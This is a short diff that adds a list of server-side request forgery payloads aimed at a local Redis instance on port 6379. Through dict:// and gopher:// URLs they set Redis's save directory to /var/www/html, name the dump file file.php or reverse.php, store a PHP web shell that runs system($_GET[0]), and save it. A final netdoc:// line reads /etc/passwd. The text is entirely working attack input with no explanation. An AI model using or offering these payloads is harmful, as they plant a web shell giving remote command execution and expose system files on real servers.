@@ -1,0 +1,8 @@
+url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
+url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
+url=dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
+url=dict://127.0.0.1:6379/SAVE
+gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
+gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
+gopher://127.0.0.1:6379/_save
+netdoc:///etc/passwd
